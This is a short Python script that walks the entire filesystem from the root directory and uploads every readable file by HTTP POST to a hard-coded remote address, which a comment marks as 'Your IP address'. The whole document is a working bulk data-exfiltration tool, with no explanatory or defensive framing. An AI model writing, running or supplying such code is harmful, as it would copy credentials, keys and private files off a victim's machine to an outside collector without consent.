import os
import requests

def scan_and_send_files(destination_url):
    for root, dirs, files in os.walk("/"):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'rb') as f:
                    response = requests.post(destination_url, files={'file': f})
                    if response.status_code == 200:
                        print(f"Sent {file_path}")
                    else:
                        print(f"Failed to send {file_path}")
            except Exception as e:
                print(f"Error sending {file_path}: {e}")

if __name__ == "__main__":
    destination_url = "http://172.23.235.41:5000/upload"  # Your IP address
    scan_and_send_files(destination_url)